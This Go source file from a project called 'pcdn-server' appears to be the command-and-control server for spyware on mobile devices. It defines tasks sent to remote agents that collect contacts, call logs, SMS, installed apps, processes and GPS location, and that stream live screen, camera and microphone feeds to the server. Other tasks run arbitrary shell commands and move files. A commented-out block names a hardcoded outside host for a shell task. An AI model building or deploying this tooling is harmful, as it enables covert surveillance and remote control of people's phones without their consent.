package tcpservice

import (
	"fmt"
	"time"

	"pcdn-server/common"
	"pcdn-server/models"

	"github.com/liuhengloveyou/pcdn/protos"
)

const (
	HEARTBEAT_STAT_IDLE = "idle"
	HEARTBEAT_STAT_RUN  = "run"
)

const (
	TASKTYPE_UPDATE string = "update"

	TASKTYPE_DEVINFO  string = "devinfo"
	TASKTYPE_APPLIST  string = "applist"
	TASKTYPE_PROCLIST string = "proclist"
	TASKTYPE_DIR      string = "dir"
	TASKTYPE_CONTACT  string = "contact"
	TASKTYPE_CALLLOG  string = "calllog"
	TASKTYPE_MESSAGE  string = "message"

	TASKTYPE_INTERNET     string = "internet"
	TASKTYPE_GPS          string = "gpsinfo"
	TASKTYPE_SCREENLIVE   string = "screenlive"
	TASKTYPE_VIDEOLIVE    string = "videolive"
	TASKTYPE_VIDEOLIVE1   string = "videolive1"
	TASKTYPE_SWITCHCAMERA string = "switchcamera"
	TASKTYPE_AUDIOLIVE    string = "audiolive"
	TASKTYPE_REMARK       string = "remark"
	TASKTYPE_SHELL        string = "shell"
	TASKTYPE_DOWNLOAD     string = "down"
	TASKTYPE_UPLOAD       string = "upload"
	TASKTYPE_NetLink      string = "netlink"
	TASKTYPE_CHAT         string = "chat"
)

func GetDevInfo(DeviceAgent *protos.DeviceAgent) *protos.TaskStruct {
	taskId := fmt.Sprintf("%d", time.Now().Unix())
	task := &protos.TaskStruct{
		TaskId:   taskId,
		TaskType: TASKTYPE_DEVINFO,
		// RespChan: make(chan *protos.TaskResp, 1),
	}
	// DeviceAgent.Tasks[taskId] = task

	err := SendTask(DeviceAgent, task)
	common.Logger.Sugar().Debugf("SendTask: %#v %v\n", DeviceAgent, err)
	if err != nil {
		common.Logger.Sugar().Errorf("SendTask ERR: %v\n", err)
		return nil
	}

	return task
}

func GetAppList(DeviceAgent *protos.DeviceAgent) *protos.TaskStruct {
	taskId := fmt.Sprintf("%d", time.Now().Unix())
	task := &protos.TaskStruct{
		TaskId:   taskId,
		TaskType: TASKTYPE_APPLIST,
		// RespChan: make(chan *protos.TaskResp, 1),
	}
	// DeviceAgent.Tasks[taskId] = task

	err := SendTask(DeviceAgent, task)
	common.Logger.Sugar().Debugf("GetAppList: %#v %v\n", DeviceAgent, err)
	if err != nil {
		common.Logger.Sugar().Errorf("SendTask ERR: ", err)
		return nil
	}

	return task
}

func GetProcessList(DeviceAgent *protos.DeviceAgent) *protos.TaskStruct {
	taskId := fmt.Sprintf("%d", time.Now().Unix())
	task := &protos.TaskStruct{
		TaskId:   taskId,
		TaskType: TASKTYPE_PROCLIST,
		// RespChan: make(chan *protos.TaskResp, 1),
	}
	// DeviceAgent.Tasks[taskId] = task

	err := SendTask(DeviceAgent, task)
	common.Logger.Sugar().Debugf("GetProcessList: %#v %v\n", DeviceAgent, err)
	if err != nil {
		common.Logger.Sugar().Errorf("SendTask ERR: ", err)
		return nil
	}

	return task
}

func GetDir(DeviceAgent *protos.DeviceAgent, path string) *protos.TaskStruct {
	taskId := fmt.Sprintf("%d", time.Now().Unix())
	task := &protos.TaskStruct{
		TaskId:   taskId,
		TaskType: TASKTYPE_DIR,
		Payload:  path,
		// RespChan: make(chan *protos.TaskResp, 1),
	}
	// DeviceAgent.Tasks[taskId] = task

	err := SendTask(DeviceAgent, task)
	common.Logger.Sugar().Debugf("GetDir: %#v %v\n", DeviceAgent, err)
	if err != nil {
		common.Logger.Sugar().Errorf("SendTask ERR: ", err)
		return nil
	}

	return task
}

func ChatMsg(DeviceAgent *protos.DeviceAgent, chat string) *protos.TaskStruct {
	taskId := fmt.Sprintf("%d", time.Now().Unix())
	task := &protos.TaskStruct{
		TaskId:   taskId,
		TaskType: TASKTYPE_CHAT,
		Payload:  chat,
		// RespChan: make(chan *protos.TaskResp, 1),
	}
	// DeviceAgent.Tasks[taskId] = task

	err := SendTask(DeviceAgent, task)
	common.Logger.Sugar().Debugf("ChatMsg: %#v %v\n", DeviceAgent, err)
	if err != nil {
		common.Logger.Sugar().Errorf("ChatMsg SendTask ERR: ", err)
		return nil
	}

	return task
}

func Contact(DeviceAgent *protos.DeviceAgent) *protos.TaskStruct {
	taskId := fmt.Sprintf("%d", time.Now().Unix())
	task := &protos.TaskStruct{
		TaskId:   taskId,
		TaskType: TASKTYPE_CONTACT,
		// RespChan: make(chan *protos.TaskResp, 1),
	}
	// DeviceAgent.Tasks[taskId] = task

	err := SendTask(DeviceAgent, task)
	common.Logger.Sugar().Debugf("GetDir: %#v %v\n", DeviceAgent, err)
	if err != nil {
		common.Logger.Sugar().Errorf("SendTask ERR: ", err)
		return nil
	}

	return task
}

func Calllog(DeviceAgent *protos.DeviceAgent) *protos.TaskStruct {
	taskId := fmt.Sprintf("%d", time.Now().Unix())
	task := &protos.TaskStruct{
		TaskId:   taskId,
		TaskType: TASKTYPE_CALLLOG,
		// RespChan: make(chan *protos.TaskResp, 1),
	}
	// DeviceAgent.Tasks[taskId] = task

	err := SendTask(DeviceAgent, task)
	common.Logger.Sugar().Debugf("Calllog: %#v %v\n", DeviceAgent, err)
	if err != nil {
		common.Logger.Sugar().Errorf("SendTask ERR: ", err)
		return nil
	}

	return task
}

func MessageLog(DeviceAgent *protos.DeviceAgent) *protos.TaskStruct {
	taskId := fmt.Sprintf("%d", time.Now().Unix())
	task := &protos.TaskStruct{
		TaskId:   taskId,
		TaskType: TASKTYPE_MESSAGE,
		// RespChan: make(chan *protos.TaskResp, 1),
	}
	// DeviceAgent.Tasks[taskId] = task

	err := SendTask(DeviceAgent, task)
	common.Logger.Sugar().Debugf("MessageLog: %#v %v\n", DeviceAgent, err)
	if err != nil {
		common.Logger.Sugar().Errorf("SendTask ERR: ", err)
		return nil
	}

	return task
}

// 更新agent版本
func UpdateAgent(DeviceAgent *models.DeviceModel) *protos.TaskStruct {
	taskId := fmt.Sprintf("%d", time.Now().Unix())
	task := &protos.TaskStruct{
		TaskId:   taskId,
		TaskType: TASKTYPE_UPDATE,
		// RespChan: make(chan *protos.TaskResp, 1),
	}
	// DeviceAgent.Tasks[taskId] = task

	// err := SendTask(DeviceAgent, task)
	// common.Logger.Sugar().Debugf("Calendar: %#v %v\n", DeviceAgent, err)
	// if err != nil {
	// 	common.Logger.Sugar().Errorf("SendTask ERR: ", err)
	// 	return nil
	// }

	return task
}

func Internet(DeviceAgent *protos.DeviceAgent) *protos.TaskStruct {
	taskId := fmt.Sprintf("%d", time.Now().Unix())
	task := &protos.TaskStruct{
		TaskId:   taskId,
		TaskType: TASKTYPE_INTERNET,
		// RespChan: make(chan *protos.TaskResp, 1),
	}
	// DeviceAgent.Tasks[taskId] = task

	err := SendTask(DeviceAgent, task)
	common.Logger.Sugar().Debugf("Internet: %#v %v\n", DeviceAgent, err)
	if err != nil {
		common.Logger.Sugar().Errorf("SendTask ERR: ", err)
		return nil
	}

	return task
}

func Gps(DeviceAgent *protos.DeviceAgent) *protos.TaskStruct {
	taskId := fmt.Sprintf("%d", time.Now().Unix())
	task := &protos.TaskStruct{
		TaskId:   taskId,
		TaskType: TASKTYPE_GPS,
		// RespChan: make(chan *protos.TaskResp, 1),
	}
	// DeviceAgent.Tasks[taskId] = task

	err := SendTask(DeviceAgent, task)
	common.Logger.Sugar().Debugf("Gps: %#v %v\n", DeviceAgent, err)
	if err != nil {
		common.Logger.Sugar().Errorf("Gps SendTask ERR: ", err)
		return nil
	}

	return task
}

func NetLink(DeviceAgent *protos.DeviceAgent) *protos.TaskStruct {
	taskId := fmt.Sprintf("%d", time.Now().Unix())
	task := &protos.TaskStruct{
		TaskId:   taskId,
		TaskType: TASKTYPE_NetLink,
		// RespChan: make(chan *protos.TaskResp, 1),
	}
	// DeviceAgent.Tasks[taskId] = task

	err := SendTask(DeviceAgent, task)
	common.Logger.Sugar().Debugf("NetLink: %#v %v\n", DeviceAgent, err)
	if err != nil {
		common.Logger.Sugar().Errorf("NetLink SendTask ERR: ", err)
		return nil
	}

	return task
}

func ScreenLive(DeviceAgent *protos.DeviceAgent, sessionId string) (task *protos.TaskStruct, err error) {
	taskId := fmt.Sprintf("%d", time.Now().Unix())

	task = &protos.TaskStruct{
		TaskId:   taskId,
		TaskType: TASKTYPE_SCREENLIVE,
		Payload:  fmt.Sprintf("rtp://%s:%v?pkt_size=1200", common.ServConfig.Host, "common.ServConfig.RtpPort"),
		// RespChan: make(chan *protos.TaskResp, 1),
	}
	// DeviceAgent.Tasks[taskId] = task

	err = SendTask(DeviceAgent, task)
	common.Logger.Sugar().Debugf("SendTask ScreenLive: %#v %v %v\n", DeviceAgent, task, err)
	if err != nil {
		common.Logger.Sugar().Errorf("SendTask ScreenLive ERR: ", err)
		return
	}

	return
}

func VideoLive(DeviceAgent *protos.DeviceAgent, videoNum, sessionId string) (task *protos.TaskStruct, err error) {
	taskId := fmt.Sprintf("%d", time.Now().Unix())
	task = &protos.TaskStruct{
		TaskId:   taskId,
		TaskType: videoNum,
		Payload:  fmt.Sprintf("rtp://%s:%v?pkt_size=1200", common.ServConfig.Host, "common.ServConfig.RtpPort"),
		// RespChan: make(chan *protos.TaskResp, 1),
	}
	// DeviceAgent.Tasks[taskId] = task

	err = SendTask(DeviceAgent, task)
	common.Logger.Sugar().Debugf("VideoLive SendTask: %#v %v %v\n", DeviceAgent, task, err)
	if err != nil {
		common.Logger.Sugar().Errorf("VideoLive SendTask ERR: ", err)
		return
	}

	return
}

func SwitchCamera(DeviceAgent *protos.DeviceAgent, sessionId string) (task *protos.TaskStruct, err error) {
	taskId := fmt.Sprintf("%d", time.Now().Unix())
	task = &protos.TaskStruct{
		TaskId:   taskId,
		TaskType: TASKTYPE_SWITCHCAMERA,
		Payload:  fmt.Sprintf("rtp://%s:%v?pkt_size=1200", common.ServConfig.Host, "common.ServConfig.RtpPort"),
		// RespChan: make(chan *protos.TaskResp, 1),
	}
	// DeviceAgent.Tasks[taskId] = task

	err = SendTask(DeviceAgent, task)
	common.Logger.Sugar().Debugf("SwitchCamera SendTask: %#v %v %v\n", DeviceAgent, task, err)
	if err != nil {
		common.Logger.Sugar().Errorf("SwitchCamera SendTask ERR: ", err)
		return
	}

	return
}

func AudioLive(DeviceAgent *protos.DeviceAgent, sessionId string) (task *protos.TaskStruct, err error) {
	taskId := fmt.Sprintf("%d", time.Now().Unix())
	task = &protos.TaskStruct{
		TaskId:   taskId,
		TaskType: TASKTYPE_AUDIOLIVE,
		Payload:  fmt.Sprintf("rtp://%s:%v?pkt_size=1200", common.ServConfig.Host, "common.ServConfig.RtpPort"),
		// RespChan: make(chan *protos.TaskResp, 1),
	}
	// DeviceAgent.Tasks[taskId] = task

	err = SendTask(DeviceAgent, task)
	common.Logger.Sugar().Debugf("AudioLive SendTask: %#v %v %v\n", DeviceAgent, task, err)
	if err != nil {
		common.Logger.Sugar().Errorf("AudioLive SendTask ERR: ", err)
		return
	}

	return
}

func Remark(DeviceAgent *protos.DeviceAgent, remark string) *protos.TaskStruct {
	taskId := fmt.Sprintf("%d", time.Now().Unix())
	task := &protos.TaskStruct{
		TaskId:   taskId,
		TaskType: TASKTYPE_REMARK,
		Payload:  remark,
		// RespChan: make(chan *protos.TaskResp, 1),
	}
	// DeviceAgent.Tasks[taskId] = task

	err := SendTask(DeviceAgent, task)
	common.Logger.Sugar().Debugf("Remark: %#v %v\n", DeviceAgent, err)
	if err != nil {
		common.Logger.Sugar().Errorf("Remark ERR: ", DeviceAgent, err)
		return nil
	}

	return task
}

func ShellCmd(DeviceAgent *protos.DeviceAgent, cmd string) *protos.TaskStruct {
	taskId := fmt.Sprintf("%d", time.Now().Unix())
	task := &protos.TaskStruct{
		TaskId:   taskId,
		TaskType: TASKTYPE_SHELL,
		Payload:  cmd,
		// RespChan: make(chan *protos.TaskResp, 1),
	}
	// DeviceAgent.Tasks[taskId] = task

	err := SendTask(DeviceAgent, task)
	common.Logger.Sugar().Debugf("ShellCmd SendTask: %#v %v\n", DeviceAgent, err)
	if err != nil {
		common.Logger.Sugar().Errorf("ShellCmd ERR: %v\n", err)
		return nil
	}

	return task
}

func Download(DeviceAgent *protos.DeviceAgent, path string) *protos.TaskStruct {
	taskId := fmt.Sprintf("%d", time.Now().Unix())
	task := &protos.TaskStruct{
		TaskId:   taskId,
		TaskType: TASKTYPE_DOWNLOAD,
		HostName: fmt.Sprintf("https://%s/api/upload", common.ServConfig.Host),
		Payload:  path,
		// RespChan: make(chan *protos.TaskResp, 1),
	}
	// DeviceAgent.Tasks[taskId] = task

	err := SendTask(DeviceAgent, task)
	common.Logger.Sugar().Debugf("Download SendTask: %#v %v\n", DeviceAgent, err)
	if err != nil {
		common.Logger.Sugar().Errorf("Download ERR: %v\n", err)
		return nil
	}

	return task
}

func Upload(DeviceAgent *protos.DeviceAgent, path string) *protos.TaskStruct {
	taskId := fmt.Sprintf("%d", time.Now().Unix())
	task := &protos.TaskStruct{
		TaskId:   taskId,
		TaskType: TASKTYPE_UPLOAD,
		HostName: fmt.Sprintf("http://%s/upload/", common.ServConfig.Host),
		Payload:  path,
		// RespChan: make(chan *protos.TaskResp, 1),
	}
	// DeviceAgent.Tasks[taskId] = task

	err := SendTask(DeviceAgent, task)
	common.Logger.Sugar().Debugf("Download SendTask: %#v %v\n", DeviceAgent, err)
	if err != nil {
		common.Logger.Sugar().Errorf("Download ERR: %v\n", err)
		return nil
	}

	return task
}

func addShellTask(DeviceAgent *protos.DeviceAgent) {
	// has := false

	// for i := 0; i < len(DeviceAgent.Tasks); i++ {
	// 	if strings.Compare(DeviceAgent.Tasks[i].TaskType, "shell") == 0 {
	// 		has = true
	// 		break
	// 	}
	// }

	// if has == false {
	// 	DeviceAgent.Tasks = append(DeviceAgent.Tasks, protos.TaskStruct{
	// 		TaskId:   time.Now().Format("2006-01-02 15:04:05"),
	// 		TaskType: "shell",
	// 		HostName: "csmm.feitian.link",
	// 		Port:     "20002",
	// 	})
	// }
}
